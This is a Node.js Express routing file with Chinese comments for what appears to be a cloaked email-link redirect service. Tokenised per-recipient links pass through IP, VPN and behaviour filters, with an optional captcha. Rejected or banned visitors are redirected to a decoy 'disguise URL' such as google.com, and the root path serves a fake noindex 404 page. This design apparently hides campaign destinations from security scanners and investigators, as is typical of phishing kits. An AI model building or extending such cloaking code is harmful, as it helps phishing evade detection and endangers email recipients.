/**
 * ============================================
 * 重定向路由
 * ============================================
 * 功能：
 * 1. 处理/:token路由（主要的重定向端点）
 * 2. 调用过滤引擎进行验证
 * 3. 根据验证结果进行重定向
 * 4. 提供测试和管理端点
 * 
 * ⚠️ 重要：路由定义顺序
 * - 具体路径（/health, /generate-token等）必须在动态路由（/:token）之前定义
 * - 根路径 / 也需要单独处理
 * - 动态路由 /:token 必须放在最后
 * ============================================
 */

const express = require('express');
const router = express.Router();
const { tokenValidator, recordTokenUsage } = require('../middleware/tokenValidator');
const { asyncHandler } = require('../middleware/errorHandler');
const IPRegistryService = require('../services/ipRegistry');
const FilterEngine = require('../services/filterEngine');
const TokenGenerator = require('../utils/tokenGenerator');
const SuffixGenerator = require('../utils/suffixGenerator'); // ← 添加后缀生成器
const BehaviorFilter = require('../filters/behaviorFilter');
const logger = require('../utils/logger');
const { config } = require('../config');

/**
 * 生成友好的404错误页面（日文）
 * @returns {string} HTML页面
 */
function generate404Page() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
      <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
      <meta name="format-detection" content="telephone=no, email=no, address=no">
    </head>
    <body>
      <div style="font-weight: bold;">404 Not Found</div>
      <div>The page never existed on the site.</div>
    </body>
    </html>
  `;
}

// ============================================
// 📌 具体路径路由（必须在动态路由之前定义）
// ============================================

/**
 * 健康检查端点
 * GET /health
 */
router.get('/health', asyncHandler(async (req, res) => {
  const health = {
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    environment: config.server.env,
  };

  // 检查关键服务
  try {
    // 测试Redis
    const Cache = require('../utils/cache');
    await Cache.get('health_check');
    health.redis = 'ok';
  } catch (error) {
    health.redis = 'error';
    health.status = 'degraded';
  }

  try {
    // 测试MySQL
    const Database = require('../database/mysql');
    await Database.query('SELECT 1');
    health.database = 'ok';
  } catch (error) {
    health.database = 'error';
    health.status = 'degraded';
  }

  const statusCode = health.status === 'ok' ? 200 : 503;
  res.status(statusCode).json(health);
}));

/**
 * 生成Token测试端点（仅开发环境）
 * GET /generate-token?email=xxx
 */
if (config.server.env === 'development' || config.debug.enabled) {
  router.get('/generate-token', asyncHandler(async (req, res) => {
    const email = req.query.email || 'test@example.com';

    try {
      const tokenResult = await TokenGenerator.generate({
        emailId: `email-${Date.now()}`,
        recipientEmail: email,
      });

      const token = tokenResult.token;
      const verifyResult = await TokenGenerator.verify(token);
      const ttl = await TokenGenerator.getTimeToLive(token);
      
      // ✅ 生成随机后缀
      const randomSuffix = SuffixGenerator.getRandomSuffix();

      res.json({
        success: true,
        token,
        suffix: randomSuffix,
        // ✅ 新格式：使用路径参数 + 随机后缀
        testURL: `${req.protocol}://${req.get('host')}/${token}${randomSuffix}`,
        tokenInfo: {
          emailId: verifyResult.data.eid,
          expiresAt: new Date(verifyResult.data.exp).toISOString(),
          timeToLive: `${Math.floor(ttl / 3600)} hours`,
          createdAt: new Date(verifyResult.data.ts).toISOString(),
        },
      });
    } catch (error) {
      logger.error('生成Token失败', {
        error: error.message,
        stack: error.stack
      });
      res.status(500).json({
        error: 'Failed to generate token',
        message: error.message,
      });
    }
  }));
}

/**
 * 统计信息端点（仅开发环境）
 * GET /stats
 */
if (config.server.env === 'development' || config.debug.enabled) {
  router.get('/stats', asyncHandler(async (req, res) => {
    const stats = await FilterEngine.getStats();
    const cacheStats = await require('../services/ipRegistry').getCacheStats();

    res.json({
      success: true,
      data: {
        ...stats,
        cache: cacheStats,
      },
    });
  }));
}

/**
 * 测试过滤器端点（仅开发环境）
 * POST /test-filter
 * Body: { ip, userAgent, language, isVPN, etc... }
 */
if (config.server.env === 'development' || config.debug.enabled) {
  router.post('/test-filter', asyncHandler(async (req, res) => {
    const result = await FilterEngine.test(req.body);
    res.json({
      success: true,
      result,
    });
  }));
}

/**
 * 清除IP记录端点（仅开发环境）
 * POST /clear-ip
 * Body: { ip }
 */
if (config.server.env === 'development' || config.debug.enabled) {
  router.post('/clear-ip', asyncHandler(async (req, res) => {
    const { ip } = req.body;

    if (!ip) {
      return res.status(400).json({
        error: 'Missing ip parameter',
      });
    }

    await BehaviorFilter.clearIPRecords(ip);
    await require('../services/ipRegistry').clearCache(ip);

    res.json({
      success: true,
      message: `Records cleared for IP: ${ip}`,
    });
  }));
}

// ============================================
// 📌 根路径处理（返回友好的404页面）
// ============================================

/**
 * 根路径处理
 * GET /
 * 
 * 访问根路径时返回友好的日文404页面
 */
router.get('/', (req, res) => {
  res.status(404).send(generate404Page());
});

// ============================================
// 📌 动态路由（必须放在最后，否则会匹配所有请求）
// ============================================

/**
 * 主重定向端点
 * GET /:token
 * 
 * URL格式：https://domain.com/xxxxxxxxxx（10位Token）
 */
router.get('/:token', tokenValidator, asyncHandler(async (req, res) => {
  const startTime = Date.now();
  const ip = req.ip || req.connection.remoteAddress;

  try {
    // 1. 获取IP信息
    logger.info('处理重定向请求', {
      ip,
      emailId: req.tokenData.eid,
    });

    const ipInfo = await IPRegistryService.getIPInfo(ip);

    // 2. 执行过滤
    const filterResult = await FilterEngine.filter(ipInfo, req, req.tokenData);

    // 3. 记录Token使用（异步，不阻塞）
    recordTokenUsage(req.tokenHash, req.tokenData).catch(err => {
      logger.error('记录Token使用失败', { error: err.message });
    });

    // 4. 根据过滤结果处理
    const redirectURL = filterResult.redirectTo;

    if (filterResult.decision === 'allow') {
      logger.info('访问允许', {
        ip,
        emailId: req.tokenData.eid,
        redirectTo: redirectURL,
        processTime: filterResult.processTime,
      });
      
      // ========== 人机验证检查 ==========
      const CaptchaService = require('../services/captchaService');
      const fs = require('fs');
      const path = require('path');
      
      // 检查人机验证是否启用
      const captchaEnabled = await CaptchaService.isEnabled();
      console.log('🔐 [CAPTCHA] 人机验证启用状态:', captchaEnabled);
      
      if (captchaEnabled) {
        // 检查IP是否被封禁
        const banStatus = await CaptchaService.checkIPBan(ip);
        
        if (banStatus.banned) {
          logger.warn('IP被封禁，拒绝访问', { ip, remainingTime: banStatus.remainingTime });
          // 封禁状态下重定向到伪装URL
          return res.redirect(302, config.domains.fallback.medium || 'https://www.google.com');
        }
        
        // 生成人机验证
        const captchaData = await CaptchaService.generate(
          req.shortToken,
          req.tokenData,
          redirectURL,
          ip
        );
        
        console.log('🔐 [CAPTCHA] 生成验证数据:', {
          captchaId: captchaData.captchaId.substring(0, 8) + '...',
          securityCount: captchaData.securityCount,
          positions: captchaData.positions
        });
        
        // 读取验证页面模板
        const templatePath = path.join(__dirname, '..', 'public', 'captcha.html');
        let htmlContent = fs.readFileSync(templatePath, 'utf8');
        
        // 替换模板变量
        htmlContent = htmlContent.replace('{{CAPTCHA_ID}}', captchaData.captchaId);
        htmlContent = htmlContent.replace('{{IMAGE_DATA}}', JSON.stringify(captchaData.imageData));
        htmlContent = htmlContent.replace('{{SECURITY_COUNT}}', captchaData.securityCount);
        
        // 返回验证页面
        return res.send(htmlContent);
      }
      // ========== 人机验证检查结束 ==========
      
      // 人机验证未启用，直接重定向
      return res.redirect(302, redirectURL);
      
    } else {
      // 过滤被拒绝
      logger.warn('访问被拒绝', {
        ip,
        emailId: req.tokenData.eid,
        reason: filterResult.reason,
        score: filterResult.score,
        redirectTo: redirectURL,
      });
      
      // 重定向到伪装URL
      return res.redirect(302, redirectURL);
    }

  } catch (error) {
    logger.error('重定向处理失败', {
      ip,
      error: error.message,
      stack: error.stack,
    });

    // 出错时重定向到备用URL
    res.redirect(302, config.domains.fallback.medium);
  }
}));

module.exports = router;
